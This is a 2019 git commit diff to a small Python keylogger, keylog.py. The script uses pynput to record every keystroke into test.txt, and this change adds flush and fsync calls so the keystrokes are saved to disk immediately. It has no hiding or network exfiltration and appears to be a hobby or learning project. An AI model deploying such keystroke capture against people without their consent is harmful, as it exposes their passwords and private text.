fd7ccda5be10d44921d410c568a4056d3cc90a56
4Sit <45738210+4Sit@users.noreply.github.com>
2019-02-10 21:04:03 +0200

    solved problem with saving

--- keylog.py
+++ keylog.py
@@ -1,5 +1,6 @@
 #input the lib
 from pynput import keyboard
+import os
 
 file = open("test.txt", "a")
 
@@ -8,20 +9,30 @@ def on_press(key):
     '''check pressed keys, AttributeError is for special keys'''
     try:
         file.write(key.char)
+        file.flush()
+        os.fsync(file.fileno())
 
     except AttributeError:
         file.write('{0}'.format(key))
+        file.flush()
+        os.fsync(file.fileno())
 
 def on_release(key):
     '''if that keys pressed go to a new line, if esc than stop a program and save changes'''
     if key == keyboard.Key.space:
         file.write("\n")
+        file.flush()
+        os.fsync(file.fileno())
 
     if key == keyboard.Key.enter:
         file.write("\n")
+        file.flush()
+        os.fsync(file.fileno())
 
     if key == keyboard.Key.esc:
         file.write("\n")
+        file.flush()
+        os.fsync(file.fileno())
         # Stop listener
         return False
 
